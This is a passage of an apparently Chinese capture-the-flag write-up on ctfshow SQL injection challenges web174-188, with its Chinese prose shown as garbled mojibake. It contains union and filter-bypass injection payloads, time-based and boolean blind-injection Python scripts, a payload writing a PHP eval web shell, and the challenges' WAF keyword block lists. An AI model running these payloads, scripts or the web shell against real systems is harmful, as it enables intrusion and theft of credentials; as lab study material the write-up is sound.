class="s2">&#34;8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;I&#34;</span><span class="p">,</span> <span class="s2">&#34;9&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;J&#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl"> 
</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><p>åˆæˆ–è€…</p>
<p><img alt="image-20250207160041895" loading="lazy" src="./assets/image-20250207160041895.png"></p>
<pre tabindex="0"><code>1&#39; union select 1,&#34;&lt;?=eval($_POST[1]);?&gt;&#34; into outfile &#34;/var/www/html/shell.php&#34; --+ 
</code></pre><h4 id="web175">web175<a hidden class="anchor" aria-hidden="true" href="#web175">#</a></h4>
<pre tabindex="0"><code>//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag
    if(!preg_match(&#39;/[\x00-\x7f]/i&#39;, json_encode($ret))){
      $ret[&#39;msg&#39;]=&#39;æŸ¥è¯¢æˆåŠŸ&#39;;
    }
      
</code></pre><p>æ£€æŸ¥å˜é‡ <code>$ret</code> ç»è¿‡ <code>json_encode</code> ç¼–ç åçš„ç»“æœä¸­æ˜¯å¦åªåŒ…å« ASCII å­—ç¬¦ï¼ˆå³å­—ç¬¦ç¼–ç èŒƒå›´åœ¨ <code>\x00</code> åˆ° <code>\x7f</code> ä¹‹é—´ï¼‰ã€‚å¦‚æœä¸æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œå°±å°† <code>$ret</code> æ•°ç»„ä¸­çš„ <code>msg</code> é”®çš„å€¼è®¾ç½®ä¸º <code>'æŸ¥è¯¢æˆåŠŸ'</code>ã€‚</p>
<p>ä¹Ÿå°±æ˜¯æ²¡æœ‰ä»»ä½•å›æ˜¾</p>
<p>æ–¹æ³•ä¸€ï¼š<strong>æ—¶é—´ç›²æ³¨</strong></p>
<p>å¤§ä½¬çš„è„šæœ¬ï¼Œç”¨çš„äºŒåˆ†æ³•</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1&#39; and &#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s1">,sleep(2),0) -- -&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>æ–¹æ³•äºŒ:åˆ©ç”¨è¯»å†™æ–‡ä»¶å†™å…¥ç½‘ç«™æ ¹ç›®å½•
<a href="http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1%27">http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1'</a> union select 1,password from ctfshow_user5 into outfile &lsquo;/var/www/html/1.txt&rsquo;&ndash;+&amp;page=1&amp;limit=10
ä¹‹åè®¿é—®http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/1.txt</p>
<h4 id="è¿‡æ»¤æ³¨å…¥å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤"><strong>è¿‡æ»¤æ³¨å…¥</strong>ï¼ˆå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰<a hidden class="anchor" aria-hidden="true" href="#è¿‡æ»¤æ³¨å…¥å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤">#</a></h4>
<h4 id="web176">web176<a hidden class="anchor" aria-hidden="true" href="#web176">#</a></h4>
<pre tabindex="0"><code>//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str){
   //ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º
  }
</code></pre><p>æ–¹æ³•ä¸€ï¼šä¸‡èƒ½é’¥åŒ™</p>
<pre tabindex="0"><code>1&#39; or 1=1--+
</code></pre><p><img loading="lazy" src="./assets/image-20250207173909940.png"></p>
<p>èƒ½æ‰¾åˆ°flag</p>
<p>æ–¹æ³•äºŒ:å¤§å°å†™ç»•è¿‡</p>
<pre tabindex="0"><code>1&#39; uNion sElect 1,2,password from ctfshow_user --+
</code></pre><h4 id="web177">web177<a hidden class="anchor" aria-hidden="true" href="#web177">#</a></h4>
<p><strong>é»‘åå•</strong>ï¼šç©ºæ ¼ã€+</p>
<p><strong>ç©ºæ ¼æ›¿ä»£</strong>ï¼š%20ï¼ˆæ™®é€šç©ºæ ¼ï¼‰ã€%09ï¼ˆæ°´å¹³åˆ¶è¡¨ç¬¦ï¼‰ã€%0aï¼ˆæ¢è¡Œç¬¦ï¼‰ã€%0bï¼ˆå›è½¦ç¬¦ï¼‰ã€%0cï¼ˆæ–°ä¸€é¡µï¼‰ã€%0dï¼ˆå‚ç›´åˆ¶è¡¨ç¬¦ï¼‰ã€%a0ã€()ã€``ã€\**\</p>
<p>å¯ä»¥ç”¨\**\ç»•è¿‡</p>
<pre tabindex="0"><code>1&#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#39;flag&#39;%23
</code></pre><p>æ–¹æ³•äºŒ:ä¸‡èƒ½é’¥åŒ™</p>
<h4 id="web178">web178<a hidden class="anchor" aria-hidden="true" href="#web178">#</a></h4>
<p><strong>é»‘åå•å¢åŠ </strong>ï¼š%20ã€*</p>
<pre tabindex="0"><code>1&#39;%09union%09select%09password,1,1%09from%09ctfshow_user%09where%09username%09=&#39;flag&#39;%23
</code></pre><p>æ–¹æ³•äºŒ:ä¸‡èƒ½é’¥åŒ™</p>
<h4 id="web179">web179<a hidden class="anchor" aria-hidden="true" href="#web179">#</a></h4>
<p><strong>é»‘åå•å¢åŠ </strong>ï¼š%09ã€%0aã€%0bã€%0d</p>
<p>è¿™é¢˜æŠŠ%09ä¹Ÿè¿‡æ»¤äº†ï¼Œè¿™é¢˜ç©ºæ ¼å¯ä»¥ç”¨%0cç»•è¿‡</p>
<pre tabindex="0"><code>1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23
</code></pre><h4 id="web180">web180<a hidden class="anchor" aria-hidden="true" href="#web180">#</a></h4>
<p><strong>é»‘åå•å¢åŠ </strong>ï¼š#</p>
<p>å¯ä»¥ç”¨&ndash;%0cä»£æ›¿#(%23)</p>
<pre tabindex="0"><code>1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c
</code></pre><p>æˆ–è€…ç›´æ¥ä¸‡èƒ½å¯†ç </p>
<pre tabindex="0"><code>id=-1&#39;or(id=26)and&#39;1&#39;=&#39;1
</code></pre><h4 id="web181">web181<a hidden class="anchor" aria-hidden="true" href="#web181">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><blockquote>
<ul>
<li>
<p><strong><code>/</code> å’Œ <code>/i</code></strong>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å®šç•Œç¬¦ï¼Œ<code>/</code> è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸï¼Œ<code>i</code> æ˜¯ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™è¿›è¡ŒåŒ¹é…ã€‚</p>
</li>
<li>
<p><strong><code>|\*</code></strong>ï¼šåŒ¹é…ç©ºæ ¼å­—ç¬¦ï¼ˆï¼‰å’Œæ˜Ÿå·ï¼ˆ<code>*</code>ï¼‰ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦åœ¨ SQL æ³¨å…¥ä¸­å¯èƒ½ä¼šè¢«ç”¨äºæ„é€ æ¶æ„è¯­å¥ã€‚</p>
</li>
<li>
<p><code>\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0</code></p>
<p>ï¼šåˆ†åˆ«åŒ¹é…ä¸åŒçš„ ASCII æ§åˆ¶å­—ç¬¦å’Œç‰¹æ®Šç©ºç™½å­—ç¬¦ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><code>\x09</code>ï¼šæ°´å¹³åˆ¶è¡¨ç¬¦ï¼ˆTabï¼‰</li>
<li><code>\x0a</code>ï¼šæ¢è¡Œç¬¦ï¼ˆLFï¼‰</li>
<li><code>\x0b</code>ï¼šå‚ç›´åˆ¶è¡¨ç¬¦</li>
<li><code>\x0c</code>ï¼šæ¢é¡µç¬¦</li>
<li><code>\x00</code>ï¼šç©ºå­—ç¬¦</li>
<li><code>\x0d</code>ï¼šå›è½¦ç¬¦ï¼ˆCRï¼‰</li>
<li><code>\xa0</code>ï¼šä¸é—´æ–­ç©ºæ ¼</li>
</ul>
</li>
<li>
<p><strong><code>\x23|\#</code></strong>ï¼šåŒ¹é…äº•å·ï¼ˆ<code>#</code>ï¼‰ï¼Œåœ¨ SQL ä¸­ï¼Œ<code>#</code> é€šå¸¸ç”¨äºæ³¨é‡Šï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨æ³¨é‡Šæ¥ç»•è¿‡ SQL è¯­å¥çš„æ£€æŸ¥ã€‚</p>
</li>
<li>
<p><strong><code>file|into|select</code></strong>ï¼šåŒ¹é…å…³é”®å­— <code>file</code>ã€<code>into</code> å’Œ <code>select</code>ï¼Œè¿™äº›å…³é”®å­—åœ¨ SQL æ³¨å…¥å’Œæ–‡ä»¶åŒ…å«æ”»å‡»ä¸­ç»å¸¸è¢«ä½¿ç”¨ã€‚</p>
</li>
</ul></blockquote>
<p><strong>æ–¹æ³•ä¸€</strong>  ç”¨likeæ¥åŒ¹é…å…³é”®è¯flag</p>
<pre tabindex="0"><code>-1&#39;%0cor%0cusername%0clike%0c&#39;flag
</code></pre><p><strong>æ–¹æ³•äºŒ</strong></p>
<pre tabindex="0"><code>-1&#39;or(id=26)and&#39;1
</code></pre><p>çœ‹åˆ°ä¸€ç¯‡å¤§ä½¬çš„æ–‡ç« ï¼Œæ„Ÿè§‰æ˜äº†ä¸å°‘</p>
<p><a href="https://exp10it.io/2022/07/ctfshow-web-sqli-171-197-writeup/#web178">ctfshow Webå…¥é—¨SQLæ³¨å…¥ web171-197 Writeup - X1r0z Blog</a></p>
<p><img alt="image-20250207214719604" loading="lazy" src="./assets/image-20250207214719604.png"></p>
<h4 id="web182">web182<a hidden class="anchor" aria-hidden="true" href="#web182">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p><strong>é»‘åå•å¢åŠ </strong>ï¼šflag</p>
<p>è¿™é¢˜å¯ä»¥ç”¨åˆ°likeè¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢</p>
<p><img alt="image-20250207211733958" loading="lazy" src="./assets/image-20250207211733958.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>-1&#39;or%0cusername%0clike%0c&#39;fl%
</code></pre><p>æˆ–è€…ç»§ç»­ä½¿ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•äºŒ</p>
<h4 id="web183">web183<a hidden class="anchor" aria-hidden="true" href="#web183">#</a></h4>
<p>æŸ¥è¯¢è¯­å¥</p>
<pre tabindex="0"><code>//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &#34;select count(pass) from &#34;.$_POST[&#39;tableName&#39;].&#34;;&#34;;  
</code></pre><p>è¿”å›é€»è¾‘</p>
<pre tabindex="0"><code>//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str){
    return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#39;, $str);
  }
</code></pre><p>æŸ¥è¯¢ç»“æœ</p>
<pre tabindex="0"><code>//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°
      $user_count = 0;
</code></pre><p>é¢˜ç›®å¤§æ¦‚çš„æ„æ€å°±æ˜¯æˆ‘ä»¬ä¼ å…¥è¡¨åè¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœè¡¨åæ­£ç¡®ï¼Œå°±ä¼šè¿”å›ç”¨æˆ·è¡¨è®°å½•æ€»æ•°1ï¼Œå¦‚æœè¡¨åé”™è¯¯åˆ™è¿”å›0ï¼Œä¸”æ¯æ¬¡æœ€å¤šåªä¼šè¿”å›1ï¼Œæ ¹æ®è¿™ä¸ªæˆ‘ä»¬å¯ä»¥å°è¯•å¸ƒå°”ç›²æ³¨ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“è¡¨å(ctfshow_user)å’Œåˆ—å(pass)ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡å¸ƒå°”ç›²æ³¨æ‹¿åˆ°flag</p>
<p>Y4tackerå¤§ä½¬çš„è„šæœ¬</p>
<pre tabindex="0"><code>import requests

url = &#39;http://ee0ad3ab-e8f0-4183-97a8-aa3c5bcbe4f4.challenge.ctf.show/select-waf.php&#39;
str = r&#34;{abcdefghijklmnopqrstuvwsyz-0123456789}&#34;
flag = &#34;&#34;
index = 0
while True:
    for i in str:
        data = {
            &#39;tableName&#39;: f&#34;(ctfshow_user)where(substr(pass,{index},1))regexp(&#39;{i}&#39;)&#34;
        }
        r = requests.post(url, data=data)
        if r.text.find(&#34;$user_count = 1;&#34;) &gt; 0:
            flag += i
            print(flag)
            break
    index += 1
</code></pre><p><img alt="image-20250207225938289" loading="lazy" src="./assets/image-20250207225938289.png"></p>
<p>ä¸æ˜¯ä¸ºä»€ä¹ˆæˆ‘flagçš„é©¬ç”²æ˜¯è¿™æ ·çš„</p>
<h4 id="web184">web184<a hidden class="anchor" aria-hidden="true" href="#web184">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>å› ä¸ºè¿™é¢˜whereè¢«banäº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨right joinè¿›è¡Œä»£æ›¿</p>
<p>ä¾æ—§æ˜¯å¸ƒå°”ç›²æ³¨</p>
<p><img alt="image-20250207231215915" loading="lazy" src="./assets/image-20250207231215915.png"></p>
<p>POC</p>
<pre tabindex="0"><code>import requests

url = &#39;http://effed757-6639-46a9-9103-22fedb04bb41.challenge.ctf.show/select-waf.php&#39;
charset = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}&#39;
flag = &#39;&#39;

for i in range(1, 50):  # å‡è®¾ flag æœ€é•¿ 50 ä¸ªå­—ç¬¦
    for j in charset:
        payload = f&#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1) regexp char({ord(j)}))&#34;
        data = {
            &#39;tableName&#39;: payload
        }
        response = requests.post(url, data=data)
        if &#34;some_success_condition&#34; in response.text:
            flag += j
            print(flag)
            break
</code></pre><h4 id="web185">web185<a hidden class="anchor" aria-hidden="true" href="#web185">#</a></h4>
<pre tabindex="0"><code>//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str){
    return preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;, $str);
  }
</code></pre><p>è¿™é¢˜æŠŠæ•°å­—banæ‰äº†</p>
<p>è¿™å…¶å®å°±å¯¼è‡´äº†æˆ‘ä»¬åœ¨æ„é€ payloadçš„æ—¶å€™æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨æ•°å­—</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨trueæ¥ä»£æ›¿æ„é€ å‡ºæ•°å­—</p>
<p>æˆ‘ä»¬çŸ¥é“true = 1</p>
<p>é‚£2å°±å¯ä»¥ç”¨true+trueæ¥è¡¨ç¤ºï¼Œä»¥æ­¤ç±»æ¨</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://33578c7b-f34a-422b-87a5-a8accac68645.challenge.ctf.show/select-waf.php&#34;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">def</span> <span class="nf">createNum</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="n">num</span> <span class="o">+=</span> <span class="s2">&#34;+true&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="n">num</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">45</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="s2">&#34;tableName&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="s2">)regexp(char(</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="si">}</span><span class="s2">)))&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;$user_count = 43;&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&#34;.&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]result is:&#34;</span><span class="o">+</span><span class="n">flag</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;}&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">                    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">                <span class="k">break</span>
</span></span></code></pre></div><h4 id="web186">web186<a hidden class="anchor" aria-hidden="true" href="#web186">#</a></h4>
<pre tabindex="0"><code>//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str){
    return preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;, $str);
  }
</code></pre><p>è§£æ³•å’Œä¸Šé¢˜ä¸€æ ·</p>
<h4 id="web187">web187<a hidden class="anchor" aria-hidden="true" href="#web187">#</a></h4>
<pre tabindex="0"><code>è¿”å›é€»è¾‘
$username = $_POST[&#39;username&#39;];
$password = md5($_POST[&#39;password&#39;],true);

//åªæœ‰adminå¯ä»¥è·å¾—flag
if($username!=&#39;admin&#39;){
   $ret[&#39;msg&#39;]=&#39;ç”¨æˆ·åä¸å­˜åœ¨&#39;;
   die(json_encode($ret));
}
      
</code></pre><blockquote>
<p><a href="https://blog.csdn.net/qq_58784379/article/details/120504844">password=md5($pass,true)ç»•è¿‡ã€å¼±ç±»å‹ã€MD5å¼ºç¢°æ’_select * from &lsquo;admin&rsquo; where password=md5($pass,tru-CSDNåšå®¢</a></p>
<p><img alt="image-20250209180556787" loading="lazy" src="./assets/image-20250209180556787.png"></p>
<p><img alt="image-20250209180634255" loading="lazy" src="./assets/image-20250209180634255.png"></p></blockquote>
<p>payload:</p>
<pre tabindex="0"><code>admin/ffifdyop
</code></pre><p><img alt="image-20250209181202696" loading="lazy" src="./assets/image-20250209181202696.png"></p>
<p>æŠ“ä¸ªåŒ…</p>
<h4 id="web188">web188<a hidden class="anchor" aria-hidden="true" href="#web188">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
  $sql = &#34;select pass from ctfshow_user where username = {$username}&#34;;
</code></pre><pre tabindex="0"><code>è¿”å›é€»è¾‘


  //ç”¨æˆ·åæ£€æµ‹
  if(preg_match(&#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#39;|\&#34;/i&#39;, $username)){
    $ret[&#39;msg&#39;]=&#39;ç”¨æˆ·åéæ³•&#39;;
    die(json_encode($ret));
  }

  //å¯†ç æ£€æµ‹
  if(!is_numeric($password)){
